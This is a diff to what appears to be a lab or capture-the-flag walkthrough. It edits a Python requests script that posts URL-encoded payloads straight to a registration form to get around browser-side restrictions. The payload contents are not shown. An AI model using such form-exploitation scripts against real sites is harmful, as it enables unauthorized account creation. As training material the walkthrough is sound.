@@ -19,6 +19,10 @@ Once you are at the webpage click on the "create account" tab navigate to regist
     - The browser will not let you exploit the form, but using requests.post() or a proxy like Burp Suite can be used to creat an account.
 
 			import requests
+
+			# Inputs:
+			url = 'https://<ip>'
+			cookie = {'PHPSESSID': '<cookie>'}
 			
 			# URL encoded payloads
 			data = (
@@ -33,7 +37,7 @@ Once you are at the webpage click on the "create account" tab navigate to regist
 			  url=url,
 			  headers={"Content-Type": "application/x-www-form-urlencoded"},
 			  data=data,
-			  cookies={'PHPSESSID': '<cookie>'},
+			  cookies=cookie,
 			  verify=False,
 			  allow_redirects=False
 			)
